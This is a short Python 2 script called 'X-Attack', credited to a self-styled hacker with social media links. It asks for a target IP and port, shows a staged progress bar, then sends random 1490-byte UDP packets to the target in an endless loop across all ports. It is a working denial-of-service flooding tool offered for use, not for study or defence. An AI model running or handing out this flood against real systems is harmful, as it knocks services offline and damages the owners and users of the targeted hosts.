import sys
import os
import time
import socket
import random

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("toilet -fmono12 -F gay X-Attack")
print
print ("\033[96m Author   : Charlie : The Hacker")
print ("YouTube : https://www.youtube.com/CharlieTheHacker")
print ("github   : https://github.com/CharlieTheHack1")
print ("Twitter : https://twitter.com/CharlieTheHack1 \033[0m")
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Starting...")
print
print "Your Attack Is On The Way..."
print

print "[                    ] 0% "
print
time.sleep(5)
print "[==========          ] 50%"
print
time.sleep(5)
print "[====================] 100%"
print
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

